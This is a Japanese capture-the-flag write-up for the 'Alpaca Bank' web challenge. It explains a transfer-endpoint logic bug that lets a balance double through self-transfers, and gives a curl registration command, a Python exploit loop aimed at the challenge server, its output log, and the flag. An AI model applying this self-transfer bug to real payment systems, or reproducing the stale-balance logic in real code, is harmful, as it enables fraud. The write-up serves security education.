# Alpaca Bank

> 🦙 < 銀行を作ってみるパカ!
>
> http://34.170.146.252:30021/

[alpaca-bank.tar.gz](https://alpacahack-prod.s3.ap-northeast-1.amazonaws.com/24c01451-dbc8-4343-abc0-dca896a2d8db/alpaca-bank.tar.gz)が提供される。

解凍すると次のファイルがある。

```
> tar -xzvf alpaca-bank.tar.gz
alpaca-bank/
alpaca-bank/compose.yaml
alpaca-bank/web/
alpaca-bank/web/package.json
alpaca-bank/web/package-lock.json
alpaca-bank/web/index.html
alpaca-bank/web/Dockerfile
alpaca-bank/web/app.js
```

`app.js`に`/api/transfer`に脆弱性がある。

```js
// web/app.js (抜粋)

const fromBalance = balances.get(fromUser);
const toBalance = balances.get(toUser);

// ... (残高不足チェックなど) ...

balances.set(fromUser, fromBalance - amount); // [A] 送金元の残高を減らす
balances.set(toUser, toBalance + amount);     // [B] 送金先の残高を増やす
```

自分自身に全額送金すると、残高が減る処理がキャンセルされ、逆に倍増するというロジックバグが存在する。

ユーザー作成

```bash
> curl -X POST -H "Content-Type: application/json" -d '{}' http://34.170.146.252:30021/api/register
{"user":"e6797ca2b640b3a2b591"}
```

pythonで送金自動化

```py
import requests
import json
import time

# ログから取得した情報
BASE_URL = "http://34.170.146.252:30021"
USER_ID = "e6797ca2b640b3a2b591" # ユーザーID
TARGET_AMOUNT = 1_000_000_000_000

def get_balance():
    response = requests.get(f"{BASE_URL}/api/user/{USER_ID}")
    data = response.json()
    return data['balance'], data.get('flag')

def transfer_to_self(amount):
    payload = {
        "fromUser": USER_ID,
        "toUser": USER_ID,
        "amount": amount
    }
    response = requests.post(
        f"{BASE_URL}/api/transfer",
        headers={"Content-Type": "application/json"},
        json=payload
    )
    if response.status_code == 200:
        print(f"[+] Transferred {amount} to self. Success.")
    else:
        print(f"[-] Error: {response.text}")

def main():
    print(f"[*] Target: {BASE_URL}")
    print(f"[*] User: {USER_ID}")

    while True:
        balance, flag = get_balance()
        print(f"[*] Current Balance: {balance:,} yen")

        if flag:
            print("\n" + "="*40)
            print(f"FLAG ACQUIRED: {flag}")
            print("="*40)
            break

        if balance >= TARGET_AMOUNT:
            # バランスはあるがフラグフィールドが取れていない場合再取得
            continue

        # 自分自身に全額送金して倍にする
        transfer_to_self(balance)
        # サーバー負荷軽減のため少し待つ（必要に応じて調整）
        time.sleep(0.1)

if __name__ == "__main__":
    main()
```

```bash
> python exploit.py
[*] Target: http://34.170.146.252:30021
[*] User: e6797ca2b640b3a2b591
[*] Current Balance: 10 yen
[+] Transferred 10 to self. Success.
[*] Current Balance: 20 yen
[+] Transferred 20 to self. Success.
[*] Current Balance: 40 yen
[+] Transferred 40 to self. Success.
[*] Current Balance: 80 yen
[+] Transferred 80 to self. Success.
[*] Current Balance: 160 yen
[+] Transferred 160 to self. Success.
[*] Current Balance: 320 yen
[+] Transferred 320 to self. Success.
[*] Current Balance: 640 yen
[+] Transferred 640 to self. Success.
[*] Current Balance: 1,280 yen
[+] Transferred 1280 to self. Success.
[*] Current Balance: 2,560 yen
[+] Transferred 2560 to self. Success.
[*] Current Balance: 5,120 yen
[+] Transferred 5120 to self. Success.
[*] Current Balance: 10,240 yen
[+] Transferred 10240 to self. Success.
[*] Current Balance: 20,480 yen
[+] Transferred 20480 to self. Success.
[*] Current Balance: 40,960 yen
[+] Transferred 40960 to self. Success.
[*] Current Balance: 81,920 yen
[+] Transferred 81920 to self. Success.
[*] Current Balance: 163,840 yen
[+] Transferred 163840 to self. Success.
[*] Current Balance: 327,680 yen
[+] Transferred 327680 to self. Success.
[*] Current Balance: 655,360 yen
[+] Transferred 655360 to self. Success.
[*] Current Balance: 1,310,720 yen
[+] Transferred 1310720 to self. Success.
[*] Current Balance: 2,621,440 yen
[+] Transferred 2621440 to self. Success.
[*] Current Balance: 5,242,880 yen
[+] Transferred 5242880 to self. Success.
[*] Current Balance: 10,485,760 yen
[+] Transferred 10485760 to self. Success.
[*] Current Balance: 20,971,520 yen
[+] Transferred 20971520 to self. Success.
[*] Current Balance: 41,943,040 yen
[+] Transferred 41943040 to self. Success.
[*] Current Balance: 83,886,080 yen
[+] Transferred 83886080 to self. Success.
[*] Current Balance: 167,772,160 yen
[+] Transferred 167772160 to self. Success.
[*] Current Balance: 335,544,320 yen
[+] Transferred 335544320 to self. Success.
[*] Current Balance: 671,088,640 yen
[+] Transferred 671088640 to self. Success.
[*] Current Balance: 1,342,177,280 yen
[+] Transferred 1342177280 to self. Success.
[*] Current Balance: 2,684,354,560 yen
[+] Transferred 2684354560 to self. Success.
[*] Current Balance: 5,368,709,120 yen
[+] Transferred 5368709120 to self. Success.
[*] Current Balance: 10,737,418,240 yen
[+] Transferred 10737418240 to self. Success.
[*] Current Balance: 21,474,836,480 yen
[+] Transferred 21474836480 to self. Success.
[*] Current Balance: 42,949,672,960 yen
[+] Transferred 42949672960 to self. Success.
[*] Current Balance: 85,899,345,920 yen
[+] Transferred 85899345920 to self. Success.
[*] Current Balance: 171,798,691,840 yen
[+] Transferred 171798691840 to self. Success.
[*] Current Balance: 343,597,383,680 yen
[+] Transferred 343597383680 to self. Success.
[*] Current Balance: 687,194,767,360 yen
[+] Transferred 687194767360 to self. Success.
[*] Current Balance: 1,374,389,534,720 yen

========================================
FLAG ACQUIRED: Alpaca{this_weekend_is_SECCON_CTF_14_Quals_dont_miss_it}
========================================
```

flag: `Alpaca{this_weekend_is_SECCON_CTF_14_Quals_dont_miss_it}`
